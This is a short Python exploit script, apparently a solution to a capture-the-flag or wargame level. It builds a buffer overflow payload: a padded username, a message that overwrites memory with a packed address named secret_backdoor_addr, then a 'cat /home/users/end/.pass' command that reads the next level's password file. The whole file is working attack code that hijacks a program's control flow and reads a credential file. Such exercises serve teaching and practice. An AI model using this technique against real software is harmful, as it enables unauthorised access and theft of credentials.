import struct
import sys

secret_backdoor_addr = 0x000055555555488c
packed_address = struct.pack("<Q", secret_backdoor_addr)

username = "\xff" * 128
sys.stdout.write(username)

message = "B" * 199 + packed_address
sys.stdout.write(message + "F" * (1022 - len(message)))

sys.stdout.write("cat /home/users/end/.pass")